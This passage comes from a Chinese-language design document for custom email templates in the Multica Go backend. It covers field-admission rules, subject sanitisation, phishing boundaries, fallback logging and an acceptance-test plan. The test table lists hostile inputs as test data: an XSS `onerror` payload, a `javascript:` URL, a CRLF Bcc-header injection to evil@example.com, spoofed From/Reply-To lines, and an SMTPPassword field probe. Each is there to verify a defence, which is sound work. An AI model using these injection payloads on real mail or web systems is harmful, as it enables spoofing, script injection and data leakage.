   显式的「跳过转义」标记，出现一个就等于在数据侧开了洞。
3. **字段准入判据（r4 按 PG16 重写为单一形式，替换 r3 的两个半句）**：

   > 模板 T 的数据结构可以包含字段 F，**当且仅当**存在一个确定性函数 `g`，使得对每一封信，
   > `F` 的值 = `g(该封信在 BASE 上已经产生的 Subject 与 HTML 正文字节)`。
   > `g` 可以截取、拼接、格式化，**不得**查库、读环境、读文件。

   一句话：**收信人今天已经能从这封信里读出来的东西，才能进数据结构。**
   判据的输入是**这封信**的输出字节，不是「仓库里是否出现过这个值」——
   这就是为什么 `FRONTEND_ORIGIN` 能进邀请模板（今天印在 `href` 里）
   而不能进验证码模板（那封信今天一个 URL 都没有）。

   r3 原文的前半句「绝不把 `*EmailService`、配置对象或 `os.Environ()` 的产物放进数据结构」
   **已删除**：它按字面读会把 `InviteURL` 一起禁掉，而 `InviteURL` 恰恰是合法的。
   删掉不放松任何约束——`{{.SMTPPassword}}` 这类凭据泄露被本判据同样拒绝
   （SMTP 密码不在任何一封信的输出字节里），而且拒绝得更干净：不依赖「配置对象」
   「`os.Environ()` 的产物」这些需要人去判断边界的词。

   **可机械执行**：拿字段清单逐个去 BASE 的渲染输出里找 `g`，写不出的当场拒绝。
   §7.1.1 给出本次全部 8 个字段的 `g`；INV13 + T26 把这份清单变成反射测试。
   **判据本身如需修订，显式改这一条并写理由**，不得绕过——绕过不留痕迹，PG16 就是绕过的产物。

#### 7.1.1 每个字段的 `g`（判据的机械执行结果）

| 结构体 | 字段 | BASE 输出中的落点 | `g` | 准入 |
|---|---|---|---|---|
| verification | `Code` | 正文 `<p style="…">%s</p>`（`:344`） | 取该 `<p>` 的内容 | ✅ |
| verification | `ExpiresInMinutes` | 正文 `This code expires in 10 minutes.`（`:345`） | 取该句中的数字 | ✅ |
| verification | `AppName` | 主题 `Your Multica verification code`（`:350`/`:359`） | 取主题中的品牌词 | ✅ |
| verification | ~~`AppURL`~~ | **无**——该封信不含任何 URL（`:340-364` 全文无 `href`） | **不存在** | ❌ 删除 |
| invitation | `InviterName` | 正文 `<strong>%s</strong>`；主题 `%s invited you to …` | 取该 `<strong>` 内容 | ✅ |
| invitation | `WorkspaceName` | 正文 `<h2>You're invited to join %s</h2>` | 取该 `<h2>` 内容 | ✅ |
| invitation | `InviteURL` | 正文 `<a href="%s">` | 恒等 | ✅ |
| invitation | `AppName` | 主题 `… on Multica` | 取主题中的品牌词 | ✅ |
| invitation | `AppURL` | 同一个 `href`：`{origin}/invite/{id}` | 去掉 `/invite/{id}` 后缀 | ✅ |

**两侧 `AppURL` 结论不同不是宽严不一**，是两侧 BASE 输出不同，判据一条没变。
邀请侧保留它另有实质必要：FuncMap 为空，模板**自己无法**从 `InviteURL` 里切掉后缀，
不给这个字段，运维方就写不出「返回首页」一类链接。

**主题模板与正文模板共用同一个数据结构（PG17，§0.9.2）**，于是验证码的**主题**模板里
可以写 `{{.Code}}`——那会把验证码送进 MTA 日志与锁屏预览，一个今天不存在的落点。
**允许**，因为模板作者等同于运维方（§7.2 的同一条信任边界），且拆成两个结构体会把
「主题里放收件人名」这类正当用法一并砍掉。**但 T21 的四语言文档必须显式警告**，
Council L2 有一条探针核对该警告存在。这里要说清楚的是：字段准入判据管的是
「哪些值能进模板」，管不住「值被用在哪」——两个问题，不能指望一条规则同时解决。

**主题模板用 `text/template`，不是 `html/template`。**
理由是现有代码自己写的（R4，`email.go:413-416`）：Subject 不做 HTML 渲染，用 HTML 转义会把
`&#34;` 之类的实体字面量泄进收件箱。

**主题的防线（r2 改写，PG1/PG3）——渲染后依次经过，全部在通道分叉之前：**

```
1. 剥离全部 unicode.IsControl 字符      ← 我方代码，覆盖两条通道
2. 200 rune 上限（A4/Q3）               ← 我方代码
3. 998 octet 的 Subject: 整行上限（INV11）← 我方代码
   ────────── 通道分叉 ──────────
4a. SMTP：mime.QEncoding.Encode          ← 纵深防御，不承担第 1 步的职责
4b. Resend：无本地编码                    ← 正因为它什么都不做，第 1 步必须在分叉前
```

**第 4a 步不是控制字符防线，只是纵深防御。** `mime.QEncoding.Encode` 并非无条件编码：
纯 ASCII 可打印串原样返回，且 **TAB 被 `needsEncoding` 显式豁免**
（`(b < ' ' || b > '~') && b != '\t'`，`encodedword.go:44`），实测 `Q("Hi\tThere") == "Hi\tThere"`。
它也**不折行**——`splitWord` 写的是空格而非 CRLF（`encodedword.go:173-178`），所以超长主题
产出的是一条超长行，这正是第 3 步存在的原因。

### 7.2 自定义模板是否可能被用于伪造发信人或钓鱼？边界在哪？

**伪造发信人：不能，且这一点是可机械验证的。**
`From:` header 与 SMTP envelope 都取自 `resolveFromEmail`（P16 → P12/`:309`/`:319`/`:357`/`:398`），
模板产出的两个字符串只会流向 `subject` 与 `htmlBody` 两个参数。模板里写 `From: evil@example.com`
只会让这行字**作为正文可见文本**出现在 body 段。INV6/T09 的探针就是断言这一点
（**注意 T09 必须解码 QP 后再断言**，PG4）。

同时划死一条边界：**模板不得控制 `Reply-To` / `Bcc` / `Cc` / 任意 header。**
`resend.SendEmailRequest`（SDK v2.28.0，已核对）确实提供 `ReplyTo` / `Bcc` / `Cc` / `Headers`
字段，本方案一个都不接线（non-goal 4）。这条必须显式写出来，因为「没接」和「接不了」在
review 时看起来一样，但含义完全不同。

**正文层面的钓鱼：能，且这是被接受的。**
运维方可以写「点此重置密码」链到任意站点。他本来就能改二进制。边界是：**这个能力止于运维方**。
- 方案 A 的开关是环境变量 + 文件系统，两者都只有能操作部署的人才能碰 → 边界成立。
- 方案 C 会把它交给租户管理员 → 边界破裂（§6 方案 C 第 3 条）。

**新引入的传输层担忧，已实测排除：**
自定义正文是任意字节，自然的疑问是「正文里写一行 `.` 能不能提前终止 SMTP DATA」。不能：
`smtp.Client.Data()` 返回 `textproto` 的 `DotWriter`（`net/smtp/smtp.go:296`），文档明载它负责
插入前导点、`\n`→`\r\n` 转换、Close 时补 `.\r\n`。这条**不需要新增防护**，但要写进验收（T10）。
**（r2 补充，PG4）**：正因为 DotWriter 会做 dot-stuffing，**测试 harness 读 DATA 时必须做
反向的 unstuffing**——BASE 那个 `readLine()` 循环（R15）会把正文里的 `.` 行读成 `..`。
用 `textproto.Reader.ReadDotBytes()` / `DotReader()`，不要手写循环。

### 7.3 模板加载失败的降级路径（r2 按 PG2 重写为三时机）

严格遵循 R6 与 F3 第 2 条（告警放行，不 fail fast）。**告警一律 `fmt.Printf` → stdout**，
与 `email.go` 既有范式一致（R6），不引入 `slog` 到本文件——这样 T12/T13/T14/T16 的捕获目标唯一。

| 时机 | 触发 | 是否改变用哪份模板 | 处置 | 日志 |
|---|---|---|---|---|
| 启动（`NewEmailService`） | `EMAIL_TEMPLATE_DIR` 目录不存在 / 不可读 | 是 | 全部四个模板保持内置；**进程正常启动** | 一行，含目录路径与 error |
| 启动 | 某个模板文件缺失 | 是 | **仅该模板**保持内置，其余照常生效 | **不告警**（缺失即「不覆盖」，是正常用法） |
| 启动 | 某个模板文件**解析**失败（语法错） | 是 | **仅该模板**回落内置 | 一行，含文件名与 parse error |
| 启动 | **零值预执行诊断**失败（未知字段等） | **否——模板照常启用** | 只是提示运维方「这个模板很可能有问题」 | 一行，含文件名与 execute error，**明确措辞为诊断而非回落**（例：`template diagnostic (template remains active)`） |
| 运行期（每次发送） | `Execute` 返回 error | 是 | **本次发送**回落内置模板，邮件照常发出 | 一行，**只含模板名与 error，绝不含数据结构或已渲染内容**（INV1） |

**零值预执行为什么只诊断不决策**：它既不 sound 也不 complete（§0.2 实测）。假阳性会让一个
**能用的模板被永久停用到下次重启**——正是 F3 第 2 条要避免的形态；假阴性让它的「通过」也不构成
保证。降级为诊断后，假阳性的代价从「功能被停用」降到「多一行日志」，假阴性不再是问题（它本来
就不承担保证）。**运行期 `Execute` 失败是唯一决定回落的机制，覆盖 100% 执行期错误、无假阳性。**

**已知代价，接受并记录**：模板持续损坏时，运行期告警**每发一封邮件出现一次**。不加限流——
邮件量本身就是天然上界，且加限流会引入「告警被吞」的新失败模式，比日志噪音更糟。

**两个容易做错的地方，写死在方案里：**

1. **渲染必须先写进 `bytes.Buffer`，`Execute` 返回 nil 才取用。**
   `Execute` 可能写出一半才失败。若把 SMTP writer 或最终 body 变量直接交给它，失败时发出去的
   是**半截邮件**——比不发信更糟，因为它看起来发成功了。INV10 就是防这一条。
2. **告警日志不得记录渲染结果或数据结构。** 验证码模板的数据结构里有 `Code`。
   一句顺手的 `fmt.Printf("render failed: %v, data=%+v", err, data)` 就把验证码写进了生产日志，
   而 §3.5 确认今天除 DEV 模式外它从不落日志。INV1 / T16 专门 grep 这一点。
   **零值预执行的诊断日志同样受此约束**——虽然它手上的 `Code` 是空串，规则要统一，
   否则将来有人把它改成用真实数据预热就破防了。

### 7.4 DEV 模式下自定义模板不生效（r4 新增，PG19 的裁决）

r3 把这个问题挂在 Council L2 的 `must_answer` 上（「DEV 模式下自定义模板是否生效？」）。
那是 PG16 的同型缺陷——一个会改变方案的行为选择被推给了评审阶段。这里裁决：

**DEV 分支在渲染之前返回，行为与 BASE 逐字相同。**

`SendVerificationCode` 的 `s.smtpHost == "" && s.client == nil` 分支只做一件事：
`fmt.Printf("[DEV] Verification code for %s: %s\n", to, code)`（`:353`）。它**不产生邮件**，
因此没有任何可以被模板影响的输出。让自定义模板在这里生效，唯一的后果是把**渲染结果**
（含验证码、含运维方写的任意文本）带进一个新的日志面——与 INV1 直接冲突，收益为零。

三点边界：

- **SMTP 与 Resend 两条真实发送路径仍共用同一次渲染**，INV8 不受影响。
  渲染发生在通道分叉之前、DEV 分支返回之后。
- **DEV 分支的 stdout 输出与 BASE 逐字节相同**，这是可证伪的，Council L2 有对应探针，
  T16 的哨兵捕获也覆盖它。
- **代价**：运维方无法在 DEV 模式下预览自己的模板。这是真实的不便，但 DEV 模式本来就不发信、
  也不渲染 HTML，「预览模板」应当由一个独立的 CLI 子命令承担（本次 non-goal），
  而不是让一个只打一行日志的调试分支去承担渲染职责。

---

## 8. 验收

全部可执行。SMTP 侧一律用 mock relay 抓 `MAIL FROM` 命令行与完整 `DATA` 载荷——BASE 的
`testSMTPServer` 没有这个能力（R14/R15/§3.6），实现方需先补 harness，见 §10。

**三条全局观测规则（PG4/PG5/PG9 的产物，适用于下表每一行）：**

- **R-OBS-1**：凡断言**正文内容**的，一律在**解码之后**断言——按 `Content-Transfer-Encoding`
  解 quoted-printable，且 DATA 必须用 `textproto` 的 DotReader 读取（反 dot-stuffing）。
  直接 grep 原始 DATA 会被 `=`→`=3D` 与 76 列软换行击穿（§12 探针 P7 有构造性反例）。
- **R-OBS-2**：凡断言**整封邮件字节相等**的，先掩蔽 `Date:` 与 `Message-ID:` 两行（R13）。
- **R-OBS-3**：凡断言**两条通道一致**的，观测点在 sink 入参处，不在 wire 上（INV8）。
- **R-OBS-4**：凡断言**告警条数**的，只数模板相关告警，不计 `NewEmailService` 无条件打印的
  通道选择行（R12）。

| # | 类型 | 场景 | 预期 | 观测点 |
|---|---|---|---|---|
| T01 | 兼容 | 不设 `EMAIL_TEMPLATE_DIR`，发验证码 | **掩蔽 `Date:`/`Message-ID:` 后**，抓到的 DATA 与内置版本逐字节相同；这两行单独断言存在且格式合法；`git diff` 显示 `buildInvitationParams`、`sanitizeSubjectField` 与 `email_test.go:270-415` 零改动（INV4/PG5） | wire（掩蔽后） |
| T02 | 兼容 | 不设 `EMAIL_TEMPLATE_DIR`，发邀请（工作区名含 `A&B <s>`） | 解码后正文含 `A&amp;B &lt;s&gt;`；主题为 `<inviter> invited you to <ws> on Multica`，与今日一致 | 解码后正文 + Subject |
| T03 | 正向 | 四个模板齐全，发验证码与邀请 | 主题与正文来自模板；`{{.Code}}` 渲染出正确验证码；`From:` 仍为配置值 | 解码后 |
| T04 | 正向 | 只提供 `invitation.html.tmpl` | 邀请正文来自模板，**邀请主题**与**验证码两项**仍为内置；无任何告警 | 解码后 |
| T05 | 正向 | 模板含非 ASCII（中文品牌名，**长度在 INV11 之下**）走 SMTP | 主题经 `QEncoding` 编码，`net/mail` + `WordDecoder` 可解回原文；正文在无 8BITMIME 的 relay 上走 quoted-printable 且可解回原文 | wire + 解码后 |
| **T05b** | 正向 | 同 T05，但 relay **广播 8BITMIME**（新增 `Advertise8BITMIME` 开关） | 正文走 `8bit`，`Content-Transfer-Encoding: 8bit`，内容与 T05 解码后相同（PG4：两条传输编码分支都要覆盖） | wire + 解码后 |
| T06 | 负向 | 正文模板写 `{{.WorkspaceName}}`，工作区名 `<img src=x onerror=alert(1)>` | **解码后**为 `&lt;img src=x onerror=alert(1)&gt;`，不产生可执行标签（INV7） | 解码后 |
| T07 | 负向 | 正文模板写 `<a href="{{.InviteURL}}">`，构造 `javascript:` 形式的 URL | **解码后**为 `#ZgotmplZ`（INV7 / §12 探针 P6） | 解码后 |
| **T08（改写）** | 负向 | 主题模板渲染出 `Hi\r\nBcc: evil@example.com`，SMTP 通道 | 用 `net/mail.ReadMessage` 解析 header：恰好一个 `Subject` 字段、值为 **`HiBcc: evil@example.com`**；**无** `Bcc`/`Cc`/`Reply-To` 字段；header 块内除行终止符外无裸 CR/LF（INV2/PG1）。**`=0D=0A` 不是本用例的预期，出现即失败** | wire header 块 |
| **T08b（新）** | 负向 | 同一主题走 **Resend** 通道 | `SendEmailRequest.Subject == "HiBcc: evil@example.com"`——证明清洗发生在通道分叉之前，不依赖 `QEncoding`（INV2 理由二） | sink 入参 |
| **T08c（新）** | 负向 | 主题模板渲染出 `Hi\tThere`（TAB） | 最终 Subject 为 `HiThere`。**这条专门锁住 PG1 的裁决依据**：`QEncoding` 对 TAB 原样放行（`encodedword.go:44`），所以剥离必须由我方代码完成 | wire + sink 入参 |
| T09 | 负向 | 正文模板中写入 `From: evil@example.com` 与 `Reply-To: evil@example.com` | `From:` header 仍为配置值；**无** `Reply-To` header；**解码后**这两行只作为正文文本出现在 body 段（INV6/PG4） | wire header + 解码后正文 |
| T10 | 负向 | 正文模板中包含一行只有 `.` 的内容 | DATA 未提前终止；**经 DotReader 反 stuffing 后**正文含恰好一个 `.` 行，邮件完整（§7.2/PG4） | 解码后 |
| **T11（改写）** | 负向 | 主题模板渲染出 300 个 **ASCII** rune | 截断到 200 rune；同时断言 `maxSubjectFieldRunes` 仍为 60、逐字段截断行为未变（INV3）；`Subject:` 行 209 octet，**不被 INV11 触碰** | sink 入参 + wire |
| T12 | 失败 | `EMAIL_TEMPLATE_DIR` 指向不存在的目录 | 进程正常启动；四封邮件全走内置；**模板相关告警恰好一条**（R-OBS-4） | stdout |
| T13 | 失败 | 模板文件语法错（`{{.Code`） | 进程正常启动；该模板回落内置，其余模板生效；恰好一条含文件名的**解析**告警 | stdout |
| **T14（改写）** | 失败 | 模板引用不存在的字段（`{{.SMTPPassword}}`） | ①进程正常启动；②恰好一条**诊断**告警，含文件名与 `can't evaluate field SMTPPassword`，措辞表明模板仍启用；③**该模板仍被选用**（不在启动期回落）；④真正发送时 `Execute` 失败 → 本次回落内置、恰好一条运行期告警、邮件照常发出（INV5/PG2）。**「解析期失败」不是本用例的预期** | stdout + 解码后 |
| **T14b（新）** | 失败 | 模板为 `{{slice .Code 0 3}}`（零值下失败、真实数据下正常） | ①启动时产生一条**诊断**告警（假阳性，预期之内）；②该模板**仍生效**，真实发送渲染出 `123`——证明诊断不决策（§0.2 假阳性用例） | stdout + 解码后 |
| **T14c（新）** | 失败 | 模板为 `{{if .Code}}{{slice .Code 0 99}}{{end}}`（零值下通过、真实数据下失败） | ①启动**无**诊断告警（假阴性，预期之内）；②真实发送时运行期回落内置 + 一条告警——证明运行期是唯一权威机制（§0.2 假阴性用例） | stdout + 解码后 |
| T15 | 失败 | 模板可解析但 `Execute` 运行期失败 | 邮件**照常发出**且内容等于内置版本；不出现截断正文（INV10） | 解码后 |
| **T16（改写）** | 凭据 | 触发 T15，验证码用固定哨兵值（如 `918273`），全量捕获 stdout + stderr | ①输出中不含哨兵（INV1）；②**同时用一条构造性反例证明探针有效**——临时把告警改成记录数据结构时该断言必须变红（以子测试或注释化的对照断言体现，不留在最终代码里）（PG8） | stdout + stderr |
| T17 | 通道一致 | 同一自定义模板分别在 SMTP 与 Resend 配置下发送 | 交给 `sendSMTP` 的 `(subject, htmlBody)` 与装进 `SendEmailRequest` 的 `(Subject, Html)` 完全相同（INV8/PG9）。**wire 级不做此断言** | sink 入参 |
| T18 | 并发 | `go test -race`，并发 50 次混合发送（验证码 + 邀请） | 无竞争报告；每封邮件内容自洽，验证码不串（INV9/U5） | 解码后 |
| T19 | 回归 | `bash scripts/test-go.sh --race`（CI 的 backend-tests 步骤，**`ci.yml:535`**；脚本自身 `cd $REPO_ROOT/server`） | 全绿，既有 `email_test.go` 全部用例不改而通过 | — |
| T20 | 部署面 | 检查 `docker-compose.selfhost.yml` | `EMAIL_TEMPLATE_DIR` 已出现在 backend 的 `environment:` 块（P19/D4） | 文件 |
| **T21（r4 再改写）** | 文档面 | 检查 11 个文档/配置文件 | 四语言 `environment-variables*.mdx` 表格新增同一行；`.env.example`、`auth-setup*.mdx`×4、`SELF_HOSTING_ADVANCED.md` 同步。文档正文另有三项**硬要求**：<br>**(a) 按字符集写明主题长度上限**（INV11 的用户可见后果，闸门 1 明确要求）：「纯中日韩主题约 **91** 字；混入空格或 ASCII 时更长；纯 ASCII 主题 200 字不受此规则影响」。**不得写一个孤零零的数字**——r2 写「约 80 字」既是错值（PG10）也是错的表达形态。<br>**(b) 数字白名单（r4，PG15）**：用户可见文本中只许出现 **91 / 99 / 200 / 67** 四个数，每个都在 §8.1 有构造、在 §12 探针 R7 有可复现命令。混排的值随构造变化，一律不进文档。<br>**(c) 验证码主题模板警告（r4，PG17）**：四语言必须各写一句「不要把 `{{.Code}}` 放进**主题**模板——主题会出现在邮件服务器日志与手机锁屏预览中，而正文不会」。这是本次唯一一处新增的凭据落点风险，不写等于默许 | 文件 |
| **T22（新，r3 显式化）** | 防漂移 | 控制字符对照表**按码位写死**：`U+0000` `U+0009`(TAB) `U+000A`(LF) `U+000B`(VT) `U+000C`(FF) `U+000D`(CR) `U+007F`(DEL) `U+0085`(NEL) `U+009F`(APC)，逐个喂给 `sanitizeSubjectField` 与 `sanitizeRenderedSubject` | 两者剥离结果一致（INV12/PG6）。这是 §4.3「两份清洗函数」代价的对冲。**r3 改为写码位**：r2 表里最后两项渲染成空白的反引号对，看起来像排版损坏，实际是 U+0085 与 U+009F 两个真字符；本轮已实测九个字符 `unicode.IsControl` 全部为 true（§12 探针 R4），所以表本身没错，错的是它不可读 | 单元 |
| **T23（新，r3 订正数字）** | 负向 | 主题模板渲染出 200 个 CJK rune（`中`×200） | 三条精确断言，**不写「约」**：①最终 `Subject:` 整行 **== 996 octet**；②截断后 rune 数 **== 91**；③`net/mail` + `WordDecoder` 能解回截断后的原文（前 91 个 `中`）。再加一条量化台阶断言：`subjectLine("中"×92) == 1018`——它说明 998 落在台阶的缝里，纯 CJK 主题**不可能**恰好等于 998（这是 T24 必须改写的原因，§0.5）。同时断言纯 ASCII 200 rune 主题 `subjectLine == 209`，**不被 octet 规则触碰**（INV11/PG3/PG10） | wire |
| **T24a（新，r3 改写，PG11）** | 不动点性质 | 对 5 个字符集 × 随机长度随机内容的主题，反复调用 `sanitizeRenderedSubject` | **不断言任何具体字符串，断言四条性质**：①结果满足 `subjectLine(out) ≤ 998`；②`out` 是 `in` 的 rune 前缀（不在多字节字符中间切断）；③**极大**——若 `out != in`，则 `out + 下一个 rune` 必然 `> 998`；④**幂等**——`f(f(x)) == f(x)`，且当 `subjectLine(in) ≤ 998` 时 `f(in) == in`（不多砍一个 rune）。性质③④合起来就是 r2 想用一个硬编码字符串表达的「边界不偏一格」，但不需要那个字符串存在。**本轮已跑通：20000 条随机输入 × 5 字符集，违例 0**（§12 探针 R2）。性质③的良定义依赖 §5.1 的单调性前提 | 单元 |
| **T24b（新，r3 新增，PG11）** | 边界（运行期推导） | 用确定性双参数枚举在运行期**推导**一个 `subjectLine == 998` 的字符串，而非硬编码一个 | 若推导成功：断言该串**不被截断**（`f(s) == s`），且 `f(s + 一个 rune)` 严格更短——把 `≤` / `<` 的差一错误钉死。若在给定枚举空间内推导不出（例如未来 Go 改了编码分组）：`t.Skip` 并打印枚举范围。**「998 是否可命中」是 Go 编码器的性质，不是我方代码的性质，所以不可命中时跳过而不是失败。** 本轮实测第一个命中组合为 `é`×122 + `a`×76 = 198 rune → 998（§12 探针 R2）；纯 CJK 与纯 ASCII 均不可命中 | 单元 |
| **T25（新）** | 负向 | 工作区名 `A&B`，自定义正文模板 `{{.WorkspaceName}}` | **解码后**正文含 `A&amp;B`，**不含** `A&amp;amp;B`（INV7 / §14 提醒 2 / §12 探针 P-esc） | 解码后 |
| **T26（新，r4，INV13/PG16）** | 契约封闭 | `reflect.TypeOf` 遍历 `verificationTemplateData` 与 `invitationTemplateData` | 三条断言：①字段名集合**严格等于** `{Code, ExpiresInMinutes, AppName}` 与 `{InviterName, WorkspaceName, InviteURL, AppName, AppURL}`——多一个、少一个、改名都红；②全部字段 `Kind() == reflect.String`；③无任何字段类型属于 `template.HTML/URL/JS/CSS/Srcset`。**这条测试的作用不是发现今天的 bug，是让今后加字段的人先撞上一条红测试**，从而必须回到 §7.1 硬规则 3 去写 `g`。测试注释里必须写明这一点，否则下一个人只会把期望值改掉 | 单元 |
| **T27（新，r4，PG18）** | 防漂移 | `ExpiresInMinutes` 由 `service` 包常量 `verificationCodeTTL` 格式化 | 断言**内置**验证码正文渲染结果包含该常量对应的分钟数字符串。这样「文案里的 10」与「模板数据里的 10」被绑到同一个常量，不再是第三处独立字面量。**明确不做**：不断言它与 `handler/auth.go:349` 的 `10 * time.Minute` 一致——那处跨文件耦合是 BASE 既有缺陷，修它要动 handler 包，会扩大改动面并破坏 INV4。**该缺陷列入 §14 的 UNVERIFIED 与后续项**，不假装本次解决了 | 单元 |

### 8.1 §8 每一个具体数字 / 字面量的出处（r3 新增）

PG10 的教训是：**一个没有出处的数字，读者无法判断它对不对，而它错了会一路传到用户可见的
文档里。** 所以 §8 里的每个具体值在这里登记「哪条探针跑出来的 + 在管线的哪个位置观测」。
没登记的值不许写进断言。**本轮全部重跑，无一沿用 r2 的记录**（除下表最右列标注「调度已复算」
的几条，那几条我按卡片指示不重复跑，但仍标出出处）。

| 值 / 字面量 | 出现在 | 观测位置 | 出处（§12 探针） | 备注 |
|---|---|---|---|---|
| `60`（`maxSubjectFieldRunes`） | T11、INV3 | 源码常量 | `email.go:24` | 调度已复算 |
| `200`（渲染后主题 rune 上限） | T11、T23 | 我方代码 | Q3 裁决值，非实测 | 调度已复算 |
| `998` | T23、T24a、T24b、INV11 | 我方代码 | RFC 5322 §2.1.1 | 调度已复算 |
| **`91`** | T23、T21、Q5b、INV11 | `subjectLine` | **R1** | **r2 写 ~81，错（PG10）** |
| **`996`** | T23 | `subjectLine` | **R1** | r2 无此值 |
| **`1018`** | T23（台阶断言） | `subjectLine` | **R1** | r2 无此值 |
| `2185` | Q5b 背景、PG3 | `subjectLine`（200 CJK） | R5 | 调度已复算 |
| `209` | T11、T23、Q5b | `subjectLine`（200 ASCII） | R5 | 调度已复算 |
| `1349` | Q5a/Q5b 背景、non-goal 10 | `subjectLine`（内置邀请主题，两个 60-rune CJK 字段） | R5 | 调度已复算 |
| **`é`×122 + `a`×76 = 198 rune → 998** | T24b | `subjectLine` | **R2** | 运行期推导，**不写进源码** |
| **`0` 违例 / 20000 条** | T24a | 单元 | **R2** | 不动点性质 |
| **`0` 非单调步 / 5×4000×全前缀** | INV11 前提（§5.1） | 单元 | **R3** | r2 从未验证 |
| 控制字符九码位 `IsControl == true` | T22 | 单元 | **R4** | 含 U+0085 / U+009F |
| `#ZgotmplZ` | T04 | 解码后正文 | **R6** | `html/template` 对 `javascript:` URL 的产出 |
| `&lt;img src=x onerror=alert(1)&gt;` | T06 | 解码后正文 | **R6** | 上下文转义结果 |
| `A&amp;B` 存在 / `A&amp;amp;B` 不存在 | T25 | 解码后正文 | **R6** | 已同时验证「喂入预转义串确实会产出 `A&amp;amp;B`」，所以这条断言有鉴别力 |
| `HiBcc: evil@example.com` | T08 | `net/mail` 解析后 | **R6** | 且恰好一个 `Subject`、无 `Bcc`/`Cc`/`Reply-To` |
| `HiThere`（TAB 被剥离） | T22 关联 | 我方清洗后 | **R6** | 并已验证 `QEncoding.Encode("Hi\tThere")` 原样返回 TAB——这正是 INV2 不能依赖 `QEncoding` 的证据 |
| `can't evaluate field SMTPPassword in type ...` | T14 | `Execute` 错误串 | **R6** | 未知字段在 `Parse` 期不报错，只在 `Execute` 期报 |
| `{{slice .Code 0 3}}` 零值报错 / 真数据 `"123"` | T13、§7.3 | 零值预执行 | **R6** | 零值预执行**不可靠**（假阳性）的构造性证据 |
| `{{if .Code}}{{slice .Code 0 99}}{{end}}` 零值通过 / 真数据报错 | T13、§7.3 | 零值预执行 | **R6** | 同上的**假阴性**方向证据；两条合起来支撑「诊断而非决策」 |
| `ci.yml:535` | T19 | 文件 | 直接读文件 | 调度已复算 |
| mock relay 不广播 8BITMIME | T05b、PG4、R14 | EHLO 应答 | `email_test.go:570-577` | 调度已复算 |
| `needsEncoding` 豁免 TAB | INV2、PG1 | Go 源码 | `encodedword.go:42-49` | 调度已复算 |
| ~~emoji 混排 `71`~~ | ~~§0.4、§5.1~~ | — | **构造未记录，不可复算** | **r4 删除（PG15，§0.10）** |
| ~~mixed `151`~~ | ~~§12 R2/B3~~ | — | **构造未记录，不可复算** | **r4 删除（PG15）**；「混排可达 998」的布尔结论改由 B5（198）承担 |
| **`😀`×56 + `a`×136 = 192 rune → 998** | §5.1 脚注 | `subjectLine` | **R7** | r4 新增，**仅为支撑「emoji 混排可达 998」**，不进文档 |
| **`67`（纯 4 字节 emoji）** | T21(b)、§5.1 | `subjectLine` | **R7**（r3 探针 G 已得同值） | 文档白名单四数之一 |
| **`99`（CJK + 空格）** | T21(b)、§5.1 | `subjectLine` | **R7** | 文档白名单四数之一 |
| `FRONTEND_ORIGIN` 在 `email.go` 仅 `:369` 一处 | §0.8、§7.1.1、INV13 | 源码 | **R7**（`grep -n`） | PG16 裁决的事实基础 |
| `10 minutes` 文案（`:345`）与 `10 * time.Minute`（`auth.go:349`）是两处独立字面量 | T27、PG18 | 源码 | **R7** | BASE 既有耦合，本次不修 |

**r4 全部保留数字已重跑一遍**（探针 R7），构造与命令见 §12。这不是形式主义：
PG13 与 PG15 都是「数字还在、构造丢了」造成的，重跑成本远低于让一个不可复算的数
再活过一轮。本轮重跑未推翻任何保留值。

---

## 9. 什么情况说明这个方案是错的

按「一旦出现即证明本方案不完整」列出，供 QA 与评审当作反例清单：

1. **上游维护者回复倾向 DB + 管理界面**（推翻 A1）。整份推荐从根上错，需重做为方案 C，
   且 §6-C 第 3 条的跨租户提权分析必须先有答案。**这是最大的单点风险，且上游问询已取消（F6），
   本次交付内不可验（U1）——它是随交付交出的开放风险，不是「没来得及验」。**
2. **发现 `docker-compose.selfhost.yml` 是生成物而非手工维护**。若它由脚本生成，P19 的写集是错的。
3. **发现某处 CI 或脚本校验四语言文档的表格行数/结构一致性**（U6 判断为无）。
4. **发现 `html/template` 的 `*Template` 并发 `Execute` 在本仓库的用法下不安全**（U5）。
   R10 确认并发可达，若 U5 结论为否，需要给每次发送 `Clone()` 或加锁，性能论证要重写。
5. **发现内置路径无法保持零 diff**——例如上游明确要求「所有邮件走同一条渲染路径」。
   那么 INV4 从结构性质退化为断言，§4.3 的两个签名决定同时失效，P17 必须改。
6. **发现验证码邮件在某条我没追到的路径上也会被发出**。我只追到 `auth.go:356` 一处调用点。
7. **发现 `sanitizeSubjectField` 之外还有别的主题构造点**。我追到三处（`:350`、`:359`、`:400`）。
8. **PR #7577 在我方 PR 之前合入，且其改动使 `sendSMTP` 的 `From:` 处理与 INV6 探针不再等价**。
   本轮已复算它仍未合入（U3），但合入时点不可预测。
9. **上游要求首版就支持多语言**（推翻 A2）。
10. **（新）发现真实 MTA 对超长 `Subject:` 行的处置与 RFC 不符**（U7）——例如主流 relay 普遍
    静默接受，那么 INV11 的 998 octet 就是一条**没有收益只有代价**的截断规则，A7 被推翻，
    应当放宽或删除。反过来若发现主流 relay 直接拒信，则 non-goal 10（不修既有内置路径的
    1349 octet 问题）站不住，**既有邀请邮件在 CJK 工作区名下本身就是坏的**，应当作为独立
    上游 Issue 提出——这会是本次工作的一个意外副产品，值得单独交出。
11. **（新）发现零值预执行诊断在真实模板上假阳性率很高**（U8）——例如运维方普遍使用
    `{{slice}}` / `{{index}}` 类表达式，那么启动时会刷出大量无意义告警，诊断的净价值为负，
    应当整条删除而不是保留（此时 §7.3 退化为「解析期 + 运行期」两时机）。
12. **（新）发现 `sanitizeRenderedSubject` 与 `sanitizeSubjectField` 实际可以合并**——
    例如上游 review 要求消除重复，那么 PG6 的平行函数决定失效，INV3 的「P09 零 diff」证据
    随之失效，INV4 的机械证明退化为断言（与第 5 条同源）。
13. **（r4，PG16）发现运维方在验证码模板里放绝对链接是**普遍**需求**——例如上游或早期用户
    反馈「没有 `{{.AppURL}}` 就没法用」。那么 §0.8 的核心论据（能力增量为零、自己敲域名即可）
    虽然仍成立，但**不便的量级被低估了**：域名变更时两处要改，运维方会漏。
    正确的响应是加回 `AppURL` **并显式修订 §7.1 硬规则 3 的判据**（写清楚新判据是什么、
    为什么这个环境变量可以进凭据类邮件），而不是悄悄加一个字段。
14. **（r4，PG16）发现 `g` 判据在某个真实字段上判不出来**——即两个人对「这个值能不能由
    今天的输出字节恢复」给出相反答案。那么「可机械执行」这个卖点是假的，判据退化成
    r3 那种需要人裁量的表述，INV13/T26 只能保证字段集合不变、不能保证新增字段合规。
